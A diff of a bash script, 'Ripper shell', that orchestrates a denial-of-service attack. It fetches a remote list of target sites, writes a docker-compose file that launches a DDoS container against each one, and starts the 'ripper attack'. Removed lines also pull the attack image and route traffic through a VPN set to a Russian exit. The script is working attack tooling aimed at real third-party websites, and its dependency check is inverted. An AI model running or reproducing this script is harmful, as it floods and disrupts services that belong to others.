@@ -1,17 +1,28 @@
 #!/bin/bash
-# Ripper shell v1.0
+# Ripper shell v2.0
 
-FILE="resources.txt"
-MODE="reinstall"
+VERSION='2.0'
+TARGETS_URL='https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
 
 function print_help {
-  echo -e "Usage: ddos.sh"
-  echo -e "--file|-f - filename where urls are located"
+  echo -e "Usage: os_x_ripper.sh --mode install"
+  echo -e "--mode|-m - runmode (install, reinstall, start, stop)"
+}
+
+function print_version {
+  echo $VERSION
+}
+
+function check_dependencies {
+  if $(docker -v | grep "Docker"); then
+    echo "Please install docker first. https://www.docker.com/products/docker-desktop"
+    exit 1
+  fi
 }
 
 function check_params {
-  if [ -z ${FILE+x} ]; then
-    echo -e "Filename is unset, please specify filename for urls file"
+  if [ -z ${MODE+x} ]; then
+    echo -e "Mode is unset, please specify correct runmode"
     exit 1
   fi
 }
@@ -28,15 +39,12 @@ function generate_compose {
             echo -e "    command: $site_url" >> docker-compose.yml
             ((counter++))
         fi
-    done < $FILE
+    done < targets.txt
 }
 
 function ripper_start {
   echo "Starting ripper attack"
-  cyberghostvpn --stop
-  docker pull nitupkcuf/ddos-ripper
   docker-compose up -d
-  cyberghostvpn --traffic --country-code RU --connect
 }
 
 function ripper_stop {
@@ -49,10 +57,6 @@ while test -n "$1"; do
   --help|-h)
     print_help
     exit
-    ;;
-  --file|-f)
-    FILE=$2
-    shift
     ;;
   --mode|-m)
     MODE=$2
@@ -67,7 +71,10 @@ while test -n "$1"; do
   shift
 done
 
+check_dependencies
 check_params
+
+curl --silent $TARGETS_URL --output targets.txt
 
 case $MODE in
   install)
